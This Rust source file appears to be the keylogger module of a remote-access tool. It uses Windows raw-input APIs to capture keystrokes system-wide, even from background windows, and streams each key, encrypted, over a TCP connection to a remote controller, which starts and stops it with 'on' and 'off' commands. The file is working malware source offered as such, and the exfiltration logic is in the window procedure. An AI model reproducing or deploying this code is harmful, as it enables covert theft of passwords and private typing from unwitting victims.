mod constants;
mod external;
mod types;

pub use constants::*;
pub use external::*;
use std::mem::{self, MaybeUninit};
use std::ops::Deref;
use std::ptr;
pub use types::*;

type Result<T> = std::result::Result<T, c_ulong>;

fn last_error<T>() -> Result<T> {
    Err(unsafe { GetLastError() })
}

pub fn get_module_handle() -> Result<HModule> {
    let instance = unsafe { GetModuleHandleA(ptr::null()) };
    if instance.is_null() {
        last_error()
    } else {
        Ok(instance)
    }
}

pub fn register_class(
    instance: HInstance,
    class_name: &'static str,
    wnd_proc: Option<WindowProc>,
) -> Result<Atom> {
    let atom = unsafe {
        RegisterClassExA(&WndClassEx {
            cb_size: mem::size_of::<WndClassEx>() as u32,
            style: 0,
            wnd_proc: Some(wnd_proc.unwrap_or(DefWindowProcA as WindowProc)),
            cls_extra: 0,
            wnd_extra: 0,
            instance,
            icon: ptr::null_mut(),
            cursor: ptr::null_mut(),
            background: ptr::null_mut(),
            menu_name: ptr::null(),
            class_name: class_name.as_ptr() as *const c_char,
            icon_sm: ptr::null_mut(),
        })
    };

    if atom == 0 {
        last_error()
    } else {
        Ok(atom)
    }
}

pub fn create_window(instance: HInstance, class_name: &'static str) -> Result<HWnd> {
    let handle = unsafe {
        CreateWindowExA(
            /* ex_style */ 0,
            /* class_name */ class_name.as_ptr() as *const c_char,
            /* window_name */ ptr::null(),
            /* style */ 0,
            /* x */ 0,
            /* y */ 0,
            /* width */ 0,
            /* height */ 0,
            /* wnd_parent */ HWND_MESSAGE,
            /* menu */ ptr::null_mut(),
            /* instance */ instance,
            /* param */ ptr::null(),
        )
    };

    if handle.is_null() {
        last_error()
    } else {
        Ok(handle)
    }
}

pub fn get_message(wnd: HWnd) -> Result<(Msg, bool)> {
    let mut msg = MaybeUninit::uninit();
    let ret = unsafe { GetMessageA(msg.as_mut_ptr(), wnd, 0, 0) };
    if ret == -1 {
        last_error()
    } else {
        let msg = unsafe { msg.assume_init() };
        Ok((msg, ret == 0))
    }
}

pub fn translate_message(msg: &Msg) -> bool {
    (unsafe { TranslateMessage(msg as *const Msg) }) != 0
}

pub fn dispatch_message(msg: &Msg) -> LResult {
    (unsafe { DispatchMessageA(msg as *const Msg) }) as isize
}

#[repr(u16)]
#[derive(Clone, Copy, Debug)]
#[allow(dead_code)] // TODO release as lib?
pub enum RawInputType {
    Pointer = HID_USAGE_GENERIC_POINTER,
    Mouse = HID_USAGE_GENERIC_MOUSE,
    Joystick = HID_USAGE_GENERIC_JOYSTICK,
    GamePad = HID_USAGE_GENERIC_GAMEPAD,
    Keyboard = HID_USAGE_GENERIC_KEYBOARD,
    Keypad = HID_USAGE_GENERIC_KEYPAD,
    MultiAxisController = HID_USAGE_GENERIC_MULTI_AXIS_CONTROLLER,
}

pub fn register_raw_input_devices(hwnd: HWnd, types: &[RawInputType]) -> Result<()> {
    // TODO we never de-register it
    let mut rid = Vec::with_capacity(types.len());

    for ty in types {
        rid.push(RawInputDevice {
            usage_page: HID_USAGE_PAGE_GENERIC, // raw keyboard data only
            usage: *ty as u16,
            flags: RIDEV_NOLEGACY | RIDEV_INPUTSINK, // no legacy, system-wide
            hwnd_target: hwnd,
        });
    }

    if unsafe {
        RegisterRawInputDevices(
            rid.as_ptr(),
            rid.len() as u32,
            mem::size_of::<RawInputDevice>() as u32,
        )
    } == 0
    {
        last_error()
    } else {
        Ok(())
    }
}

pub struct RawInputValue {
    buffer: Vec<c_void>,
}

impl RawInputValue {
    pub fn keyboard(&self) -> Option<&RawKeyboard> {
        if self.header.ty == RIM_TYPEKEYBOARD {
            Some(unsafe { &self.data.keyboard })
        } else {
            None
        }
    }
}

impl Deref for RawInputValue {
    type Target = RawInput;

    fn deref(&self) -> &Self::Target {
        unsafe { &*(self.buffer.as_ptr() as *const Self::Target) }
    }
}

impl RawKeyboard {
    pub fn key(&self) -> char {
        std::char::from_u32(unsafe { MapVirtualKeyA(self.vkey.into(), MAPVK_VK_TO_CHAR) }).unwrap()
    }
}

pub fn get_raw_input_data(handle: HRawInput) -> std::result::Result<RawInputValue, ()> {
    let mut size = 0;
    let ret = unsafe {
        GetRawInputData(
            handle,
            RID_INPUT,
            std::ptr::null_mut(),
            &mut size,
            std::mem::size_of::<RawInputHeader>() as u32,
        )
    };
    if ret == -1i32 as u32 {
        return Err(());
    }

    let len = size as usize;
    let mut lpb = Vec::with_capacity(len);
    let ret = unsafe {
        GetRawInputData(
            handle,
            RID_INPUT,
            lpb.as_mut_ptr(),
            &mut size,
            std::mem::size_of::<RawInputHeader>() as u32,
        )
    };
    if ret != len as u32 {
        return Err(());
    }

    Ok(RawInputValue { buffer: lpb })
}

pub fn post_quit_message(exit_code: i32) {
    unsafe { PostQuitMessage(exit_code) };
}

pub fn default_wnd_proc(wnd: HWnd, message: u32, wparam: WParam, lparam: LParam) -> LResult {
    unsafe { DefWindowProcA(wnd, message, wparam, lparam) }
}

use simple_crypt::encrypt;
use std::{
    io::Write,
    net::TcpStream,
    sync::{Mutex, Arc, atomic::{AtomicBool, Ordering}},
    thread::JoinHandle
};

static mut STREAM: Option<Mutex<TcpStream>> = None;
static mut SHARED_SECRET: Option<[u8; 32]> = None;
static mut THREAD_HANDLE: Option<Arc<Mutex<Option<JoinHandle<()>>>>> = None;
static mut STOP_FLAG: Option<Arc<AtomicBool>> = None;

const CLASS_NAME: &str = "kl";

pub fn keylogger(stream: &mut TcpStream, command: String, shared_secret: &[u8; 32]) -> Result<Box<dyn std::error::Error>> {
    let parts: Vec<&str> = command.split(" ").collect();
    let state = parts[1];

    // Store the stream and shared_secret in the static variables
    unsafe {
        STREAM = Some(Mutex::new(stream.try_clone().unwrap()));
        SHARED_SECRET = Some(*shared_secret);
    }

    match state {
        "on" => {
            unsafe {
                if STOP_FLAG.is_none() {
                    STOP_FLAG = Some(Arc::new(AtomicBool::new(false)));
                }

                if THREAD_HANDLE.is_none() {
                    THREAD_HANDLE = Some(Arc::new(Mutex::new(None)));
                } else if THREAD_HANDLE.as_ref().unwrap().lock().unwrap().is_some() {
                    return Ok(Box::new(std::io::Error::new(std::io::ErrorKind::AlreadyExists, "Keylogger already running")));
                }

                let thread_handle = THREAD_HANDLE.as_ref().unwrap().clone();
                let stop_flag = STOP_FLAG.as_ref().unwrap().clone();
                let handle = std::thread::spawn(move || {
                    let instance = get_module_handle().unwrap();
                    register_class(instance, CLASS_NAME, Some(wnd_proc)).unwrap();
                    let wnd = create_window(instance, CLASS_NAME).unwrap();
                    loop {
                        if stop_flag.load(Ordering::Relaxed) {
                            break;
                        }
                        let (msg, quit) = get_message(wnd).unwrap();
                        if quit {
                            break;
                        }
                
                        translate_message(&msg);
                        dispatch_message(&msg);
                    };
                });

                *thread_handle.lock().unwrap() = Some(handle);
            }
        }
        "off" => {
            unsafe {
                if let Some(stop_flag) = &STOP_FLAG {
                    stop_flag.store(true, Ordering::Relaxed);
                }
                if let Some(thread_handle) = &THREAD_HANDLE {
                    if let Some(handle) = thread_handle.lock().unwrap().take() {
                        handle.join().unwrap();
                    }
                }
                let message = format!("|!!done!!|");
                let encrypted_data = encrypt(message.as_bytes(), shared_secret).expect("Failed to encrypt");
                stream.write(&encrypted_data).expect("Error writing to stream");
                stream.flush().expect("Error flushing stream");
                STOP_FLAG = None;
            }
        }
        _ => {
            return Ok(Box::new(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid state")));
        }
    }
    Ok(Box::new(std::io::Error::new(std::io::ErrorKind::Other, "Keylogger exited")))
}

extern "C" fn wnd_proc(
    wnd: HWnd,
    message: u32,
    wparam: WParam,
    lparam: LParam,
) -> LResult {
    match message {
        WM_CREATE => {
            register_raw_input_devices(
                wnd,
                &[
                    RawInputType::Keyboard,
                ],
            )
            .unwrap();
        }
        WM_INPUT => {
            let raw_input = match get_raw_input_data(lparam as HRawInput) {
                Ok(x) => x,
                Err(_) => return 0,
            };

            // print!("{:?}, ", raw_input.header);
            if let Some(keyboard) = raw_input.keyboard() {
                if keyboard.message == WM_KEYDOWN {
                    return 0;
                }
                let key = keyboard.key();
                println!("Pressed '{}'", key);

                // Access the stream and shared_secret
                unsafe {
                    if let (Some(ref stream_mutex), Some(ref shared_secret)) = (&STREAM, &SHARED_SECRET) {
                        let mut stream = stream_mutex.lock().unwrap();
                        let encrypted_data = encrypt(key.to_string().as_bytes(), shared_secret).expect("Failed to encrypt");
                        stream.write(&encrypted_data).expect("Error writing to stream");
                        stream.flush().expect("Error flushing stream");
                    }
                }
            }
        }
        WM_CLOSE => {
            post_quit_message(0);
        }
        _ => {
            return default_wnd_proc(wnd, message, wparam, lparam);
        }
    }
    0
}